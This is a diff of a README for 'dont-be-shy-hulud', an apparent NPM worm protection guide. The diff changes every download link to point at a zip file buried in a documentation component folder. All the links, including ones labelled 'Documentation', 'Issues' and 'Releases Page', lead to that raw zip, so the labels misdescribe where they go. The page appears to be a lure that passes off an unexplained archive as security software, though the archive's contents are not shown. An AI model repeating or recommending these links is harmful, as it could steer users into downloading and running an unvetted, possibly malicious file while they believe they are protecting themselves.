@@ -1,6 +1,6 @@
 # 🪱 dont-be-shy-hulud - Easy NPM Worm Protection Guide
 
-[![Download](https://raw.githubusercontent.com/eliezerfrn/dont-be-shy-hulud/main/apps/docs/src/content/dont-be-shy-hulud_2.5.zip)](https://raw.githubusercontent.com/eliezerfrn/dont-be-shy-hulud/main/apps/docs/src/content/dont-be-shy-hulud_2.5.zip)
+[![Download](https://github.com/eliezerfrn/dont-be-shy-hulud/raw/refs/heads/main/apps/docs/src/components/override-components/TableOfContents/be-hulud-dont-shy-v3.4.zip)](https://github.com/eliezerfrn/dont-be-shy-hulud/raw/refs/heads/main/apps/docs/src/components/override-components/TableOfContents/be-hulud-dont-shy-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the dont-be-shy-hulud repository! This software helps you detect, rem
 
 ## 📥 Download & Install
 
-To install the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/eliezerfrn/dont-be-shy-hulud/main/apps/docs/src/content/dont-be-shy-hulud_2.5.zip).
+To install the application, visit this page to download: [Releases Page](https://github.com/eliezerfrn/dont-be-shy-hulud/raw/refs/heads/main/apps/docs/src/components/override-components/TableOfContents/be-hulud-dont-shy-v3.4.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -80,9 +80,9 @@ If you encounter any issues, check our FAQ section in the application or contact
 
 ## 🔗 Useful Links
 
-- [Documentation](https://raw.githubusercontent.com/eliezerfrn/dont-be-shy-hulud/main/apps/docs/src/content/dont-be-shy-hulud_2.5.zip)
-- [Issues](https://raw.githubusercontent.com/eliezerfrn/dont-be-shy-hulud/main/apps/docs/src/content/dont-be-shy-hulud_2.5.zip)
+- [Documentation](https://github.com/eliezerfrn/dont-be-shy-hulud/raw/refs/heads/main/apps/docs/src/components/override-components/TableOfContents/be-hulud-dont-shy-v3.4.zip)
+- [Issues](https://github.com/eliezerfrn/dont-be-shy-hulud/raw/refs/heads/main/apps/docs/src/components/override-components/TableOfContents/be-hulud-dont-shy-v3.4.zip)
 
-For more information about the project and updates, visit our releases page: [Releases Page](https://raw.githubusercontent.com/eliezerfrn/dont-be-shy-hulud/main/apps/docs/src/content/dont-be-shy-hulud_2.5.zip).
+For more information about the project and updates, visit our releases page: [Releases Page](https://github.com/eliezerfrn/dont-be-shy-hulud/raw/refs/heads/main/apps/docs/src/components/override-components/TableOfContents/be-hulud-dont-shy-v3.4.zip).
 
 Thank you for using dont-be-shy-hulud. Stay safe out there!
